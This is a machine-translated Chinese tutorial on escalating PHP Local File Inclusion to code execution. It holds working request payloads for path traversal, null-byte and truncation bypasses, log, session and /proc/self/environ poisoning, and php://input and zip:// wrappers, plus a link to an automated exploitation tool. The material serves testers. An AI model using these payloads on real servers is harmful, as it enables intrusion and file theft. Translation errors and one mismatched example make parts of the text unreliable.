<html>
<head>
<title>CVV #1: Local File Inclusion</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">CVV #1:本地文件包含</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cvv-1-local-file-inclusion-ebc48e0e479a?source=collection_archive---------0-----------------------#2018-06-20">https://infosecwriteups.com/cvv-1-local-file-inclusion-ebc48e0e479a?source=collection_archive---------0-----------------------#2018-06-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e36a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个关于“常见漏洞载体”和相关利用方法的简短系列。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/2b636d89c7f90d5c2b8b2e30de78526a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1100/1*NmmD3bM03AhyDPAF0xYA3w.gif"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">只是一个毫无意义的形象</figcaption></figure></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="f1ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将从一个非常著名且古老的向量开始这个系列:<strong class="jp ir">本地文件包含</strong>(简称:“LFI”)。</p><p id="b6b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据维基百科，“LFI”被描述为:</p><blockquote class="le lf lg"><p id="4379" class="jn jo lh jp b jq jr js jt ju jv jw jx li jz ka kb lj kd ke kf lk kh ki kj kk ij bi translated"><em class="iq">一种“文件包含漏洞”[…]，通常会影响依赖脚本运行时的web应用程序[…]，本地文件(即当前服务器上的文件)可能会被包含在内以供执行。”</em></p></blockquote><p id="761f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有一个简短的例子(用PHP编写)很好地描述了漏洞(及其基本形式):</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="1d3e" class="lq lr iq lm b gy ls lt l lu lv">&lt;?php <br/>   include($_GET['filename'] . '.php'); <br/>?&gt;</span></pre><p id="55a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过使用<a class="ae lw" href="https://en.wikipedia.org/wiki/Directory_traversal_attack" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">路径遍历</strong> </a>来导航和包含敏感或有用的文件，可以很容易地利用这个示例，在这个示例中<em class="lh"> /etc/passwd/ </em>基于服务器的操作系统是基于Linux的假设:</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="df4d" class="lq lr iq lm b gy ls lt l lu lv">GET vulnerable.php?filename=../../../etc/passwd HTTP/1.1<br/>Host: victim.com</span></pre><p id="5609" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">HTTP响应:</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="ef6a" class="lq lr iq lm b gy ls lt l lu lv">root:x:0:0:root:/root:/bin/bash<br/>bin:x:1:1:bin:/bin:/sbin/nologin</span></pre></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="67d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">虽然这种类型的漏洞非常古老，但如果被发现，很有可能会将“LFI”扩展为一个<a class="ae lw" href="https://en.wikipedia.org/wiki/Arbitrary_code_execution" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">远程代码执行</strong> </a>。所以:<strong class="jp ir"> </strong>在测试模板、附件、请求、读或写操作等与文件处理相关的功能时，尽量记住“LFI”。</p><p id="481a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下内容根据我目前的知识描述了将“LFI”扩展为“RCE”时可能有用的方法。</p><p id="b46e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢:<em class="lh"> _lavalamp、smiegles、arr0way、d.w .、swisskey、rawsec_cyber、j.adriaans </em>为本主题贡献他们的知识。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="48f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> [1]路径截断</strong></p><p id="84eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PHP默认处理<em class="lh"> /etc/passwd </em>，如<em class="lh"> /etc/passwd/ </em>或<em class="lh">/etc/passwd//</em>或<em class="lh"> /。/etc/passwd </em>，在打开文件之前，尾部的斜线会被去掉。在大多数PHP安装中，长于<em class="lh">4096</em>T30】字节的文件名会被截掉，因此多余的字符会被丢弃。这允许通过简单地将带有尾随斜线的参数推过其大小来绕过硬编码的文件扩展名:</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="d9de" class="lq lr iq lm b gy ls lt l lu lv">GET vulnerable.php?filename=../../../etc/passwd/././././././././/././././././././././[ and so on ] HTTP/1.1</span></pre></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="cc34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> [2]空字节注入</strong></p><p id="0a65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">URL编码的nullbyte <em class="lh"> %00 </em>可以在PHP ≤ <em class="lh"> v.5.3. </em>上使用，以切断硬编码的文件扩展名。由于PHP与C的关系，这是可能的。在C中，一个空字节代表一个字符串的结尾，因此空字节之后的所有字符都将被忽略。</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="eb01" class="lq lr iq lm b gy ls lt l lu lv">GET vulnerable.php?filename=../../../etc/passwd%00 HTTP/1.1</span></pre></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="b2ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> [3] /proc/self </strong></p><p id="40e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为Linux系统几乎所有的事情都使用文件结构，所以可以通过<em class="lh"> /proc/self/environ访问当前进程(self)的环境变量。</em>其中一个环境变量集(如果<em class="lh"> apache2 </em>正在运行)是用户代理，它可以通过HTTP请求来控制。在这种情况下,“RCE”可以通过请求文件以及写入HTTP用户代理字段的有效载荷来实现。</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="7989" class="lq lr iq lm b gy ls lt l lu lv">GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1<br/>User-Agent: &lt;?=phpinfo(); ?&gt;</span></pre><p id="43be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">类似地，<em class="lh">/proc/self/FD/&lt;id&gt;</em>(或者它的符号链接:<em class="lh"> /dev/fd </em>)可以与HTTP Referer字段结合使用，将有效负载注入到由<em class="lh"> apache2 </em>打开的错误日志中。尽管需要先强行使用这些id来确定引用打开文件的当前活动的文件描述符。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="ee47" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> [4] PHP包装器</strong></p><p id="4fbe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一些PHP包装器可以通过PHP守护进程访问不同的I/O或数据流，并且可以(如果启用的话；allow_url_include)导致直接执行指令。<em class="lh"> php://input </em>是一个只读流，允许从请求体中读取原始数据。在这种情况下，可以通过后请求插入代码:</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="3855" class="lq lr iq lm b gy ls lt l lu lv">POST vulnerable.php?filename=<!-- -->php://input<!-- --> HTTP/1.1<br/>Host: victim.com</span><span id="952f" class="lq lr iq lm b gy lx lt l lu lv">&lt;?=system('ls'); ?&gt;</span></pre><p id="cde4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">php://filter 是一种元包装器，允许在打开时对流应用过滤器。它可以用来读取PHP文件的内容(当以自然的方式包含时，它会被解释):</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="e374" class="lq lr iq lm b gy ls lt l lu lv">GET vulnerable.php?filename=<!-- -->php://filter/convert.base64-encode/resource=../<!-- -->vulnerable.php HTTP/1.1</span></pre><p id="4839" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这种情况下，响应是Base64编码的(还有其他返回响应的变体，例如ROT13编码:<em class="lh">filter/read = string . rot 13/resource =)../vulnerable.php </em>)。</p><p id="965f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果易受攻击的应用程序接受文件上传，则可以使用<em class="lh"> zip:// </em>或<em class="lh"> phar:// </em> (PHP存档格式)包装指向上传和压缩版本的有效负载，并通过直接路径声明对其进行解包:</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="3298" class="lq lr iq lm b gy ls lt l lu lv">zip archive.zip payload.php<br/>--<br/>GET vulnerable.php?filename=zip://archive.zip%23payload.php HTTP/1.1</span></pre><p id="0919" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">包装器不需要. zip文件扩展名来解包和解释数据(也可以使用重命名的ZIP存档)。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="cdae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">【5】原木中毒</strong></p><p id="1311" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Apache或Nginx等Web服务器将用户请求或应用程序相关的错误(如堆栈跟踪)记录到服务器上的特定日志文件中。这些文件可以通过例如经由某种HTTP方法用有效载荷请求HTTP状态<em class="lh"> 404 </em>(未找到的页面)来操纵。当心！包含这些文件会使浏览器崩溃(日志文件可能很大)。</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="7dcb" class="lq lr iq lm b gy ls lt l lu lv">GET vulnerable.php?filename[]= HTTP/1.1<br/>Referer: &lt;?=phpinfo();?&gt;<br/>--<br/>GET vulnerable.php?filename=<!-- -->../../../<!-- -->var/log/nginx/error_log HTTP/1.1</span></pre><p id="e81c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还可以使用<em class="lh"> SSH </em>认证(类似的认证方案如FTP也在工作)通过连接到SSH服务来交付和执行有效负载:</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="95a3" class="lq lr iq lm b gy ls lt l lu lv">ssh &lt;?=phpinfo();?&gt;@&lt;ip-of-vulnerable-target&gt;<br/>--<br/>GET vulnerable.php?filename=<!-- -->../../../<!-- -->var/log/auth.log HTTP/1.1</span></pre><p id="ee9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> [6] PHP会话</strong></p><p id="9dd4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PHP将其用户会话存储在位于<em class="lh">/var/lib/phpX/sess _&lt;PHPSESSID&gt;</em>(其中x =版本)下的文件中。如果应用程序上有任何功能，如将数据推入当前用户会话文件的登录(例如，用于稍后反映它的用户名)，则该功能可能被滥用来将有效载荷保存到当前会话文件中。</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="5e1f" class="lq lr iq lm b gy ls lt l lu lv">POST login.php HTTP/1.1<br/>Host: victim.com</span><span id="6e99" class="lq lr iq lm b gy lx lt l lu lv">username=&lt;?=phpinfo();?&gt;&amp;password=test<br/>---<br/>GET vulnerable.php?filename=<!-- -->../../../<!-- -->var/log/nginx/error_log HTTP/1.1</span></pre></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="39df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">【7】phpinfo()</strong></p><p id="902a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">phpinfo()函数的输出包含PHP变量的值，包括通过POST、GET或FILE请求设置的任何值。这可用于调试解释器的行为，例如上传一个临时存储在<em class="lh"> /tmp/ &lt; random &gt; </em>中的文件，并在调用结束时删除。通过对函数进行多次上传并仔细控制读取，可以检索临时文件的名称并发出请求，指定临时文件名。由D35m0nd142创建的“LFISuite”允许利用这种复杂的方法:</p><div class="ly lz gp gr ma mb"><a href="https://github.com/D35m0nd142/LFISuite" rel="noopener  ugc nofollow" target="_blank"><div class="mc ab fo"><div class="md ab me cl cj mf"><h2 class="bd ir gy z fp mg fr fs mh fu fw ip bi translated">D35m0nd142/LFISuite</h2><div class="mi l"><h3 class="bd b gy z fp mg fr fs mh fu fw dk translated">LFISuite -全自动LFI开发(+反向外壳)和扫描仪</h3></div><div class="mj l"><p class="bd b dl z fp mg fr fs mh fu fw dk translated">github.com</p></div></div><div class="mk l"><div class="ml l mm mn mo mk mp kr mb"/></div></div></a></div></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="6f54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">【8】电子邮件</strong></p><p id="5515" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果服务器正在运行邮件服务，则可以通过邮件发送有效负载，并将其包含在<em class="lh"> /var/log/ &lt;用户&gt; </em>下的相关日志中(其他每个用户都有自己的文件)。</p><pre class="km kn ko kp gt ll lm ln lo aw lp bi"><span id="dee2" class="lq lr iq lm b gy ls lt l lu lv">mail -s "&lt;?=phpinfo();?&gt;" www-data@victim.com &lt; /dev/null<br/>---<br/>GET vulnerable.php?filename=<!-- -->../../../<!-- -->var/log/www-data HTTP/1.1</span></pre></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="9bf7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你学到了一些新东西。如果您发现任何内容相关或语法错误或有任何补充，请写下评论。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="d41e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">诚挚的问候</p><p id="20d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">SI9INT(<a class="ae lw" href="http://twitter.com/@si9int" rel="noopener ugc nofollow" target="_blank">twitter.com/@si9int</a>|<a class="ae lw" href="https://si9int.sh" rel="noopener ugc nofollow" target="_blank">https://SI9INT . sh</a>)</p></div></div>    
</body>
</html>